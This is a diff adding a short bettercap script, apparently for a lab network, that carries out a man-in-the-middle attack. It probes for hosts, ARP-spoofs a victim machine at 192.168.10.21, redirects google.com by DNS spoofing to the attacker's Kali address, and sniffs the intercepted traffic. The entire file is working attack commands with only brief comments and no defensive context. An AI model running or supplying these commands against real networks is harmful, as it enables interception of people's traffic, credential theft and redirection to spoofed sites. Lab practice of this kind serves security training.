@@ -1,0 +1,18 @@
+# Start bettercap on the primary interface
+bettercap -iface eth0
+
+# Discovery: Probe the network for targets
+net.probe on
+net.show
+
+# Target: Set the Alpine machine as the victim
+set arp.spoof.targets 192.168.10.21
+arp.spoof on
+
+# DNS Spoof: Redirect google.com to the attacker's local IP (kali)
+set dns.spoof.domains google.com
+set dns.spoof.address 192.168.10.20
+dns.spoof on
+
+# Monitoring: Sniff the intercepted traffic
+net.sniff on
